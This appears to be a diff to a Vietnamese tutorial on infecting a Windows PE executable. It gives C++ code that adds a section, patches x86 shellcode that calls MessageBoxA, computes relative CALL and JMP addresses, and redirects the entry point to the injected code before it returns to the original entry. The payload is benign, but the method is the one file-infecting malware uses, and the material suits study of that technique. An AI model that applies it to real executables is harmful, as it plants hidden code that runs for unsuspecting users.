@@ -239,7 +239,7 @@ char shellCode[] =
     "\xE9\x00\x00\x00\x00";     // JMP 1012475
 ```
 
-Đầu tiên ta cần đưa 2 đoạn string mà ta cần vào trong section tại một địa chỉ nhất định
+Đầu tiên ta cần đưa 2 đoạn string mà ta cần vào trong section tại một địa chỉ nhất định rồi sau đó thay đổi shellcode để lấy được 2 strings dựa vào địa chỉ của chúng
 
 ```Cpp
 HANDLE hFile;
@@ -317,4 +317,58 @@ memcpy((PBYTE)lpFileBase + sectionHeader->PointerToRawData + captionOffset, capt
 // Edit shellcode with 2 added strings
 *(DWORD*)(shellCode + 3) = sectionHeader->VirtualAddress + ntHeaders->OptionalHeader.ImageBase + titleOffset;
 *(DWORD*)(shellCode + 8) = sectionHeader->VirtualAddress + ntHeaders->OptionalHeader.ImageBase + captionOffset;
+```
+
+Vì lệnh CALL sẽ gọi đến địa chỉ tương đối (Relative Address) của một hàm nên trong khi debug ta sẽ thấy địa chỉ trên shellcode là 0x761FBE2D. Địa chỉ này được tính như sau:
+
+> Địa chỉ tương đối = Địa chỉ của hàm - Địa chỉ của lệnh tiếp theo
+
+Vì thế, ta cần một hàm có thể lấy được địa chỉ của hàm ta cần gọi (trong trường hợp này là hàm `MessageBoxA()`)
+
+```Cpp
+DWORD GetMessageBoxAAddress() {
+    HMODULE user32Module = LoadLibraryA("user32.dll");
+    if (user32Module != NULL) {
+        FARPROC messageBoxAddr = GetProcAddress(user32Module, "MessageBoxA");
+        FreeLibrary(user32Module); // Free the module handle since we've obtained the address
+        if (messageBoxAddr != NULL) {
+            return (DWORD)messageBoxAddr;
+        }
+    }
+    return 0; // Return 0 if unable to get the address
+}
+```
+
+Còn địa chỉ lệnh tiếp theo là địa chỉ của lệnh sau lệnh CALL. Như vậy là ta có thể tính được địa chỉ của lệnh tiếp theo như sau:
+
+```Cpp
+DWORD messageBoxARVA = GetMessageBoxAAddress() - (sectionHeader->VirtualAddress + ntHeaders->OptionalHeader.ImageBase + 19);
+*(DWORD*)(shellCode + 15) = messageBoxARVA;
+```
+
+Tương tự như lệnh CALL, địa chỉ trong lệnh JMP cũng là một địa chỉ tương đối với cách tính như sau
+
+> Địa chỉ đích = Địa chỉ của lệnh tiếp theo + Địa chỉ tương đối
+
+Rồi ta cũng cần một hàm để tính được địa chỉ tương đối này như sau:
+
+```Cpp
+DWORD calculateJMPAdress(DWORD instructionAddress, DWORD targetAddress) {
+    if (targetAddress >= instructionAddress) {
+        return targetAddress - instructionAddress;
+    }
+    else {
+        return (0xFFFFFFFF - instructionAddress) + targetAddress + 1;
+    }
+}
+```
+
+Cuối cùng, ta đã có thể tạo ra một shellcode hoàn chỉnh và thêm shellcode vào section cùng với việc đổi `OEP` theo địa chỉ của section là vấn đề của chúng ta đã hoàn thành.
+
+```Cpp
+DWORD oldOEP = ntHeaders->OptionalHeader.ImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
+DWORD jmpRVA = calculateJMPAdress(nextJMPAddress, oldOEP);
+*(DWORD*)(shellCode + 20) = jmpRVA;
+memcpy((PBYTE)lpFileBase + sectionHeader->PointerToRawData, shellCode, sizeof(shellCode));
+ntHeaders->OptionalHeader.AddressOfEntryPoint = sectionHeader->VirtualAddress;
 ```
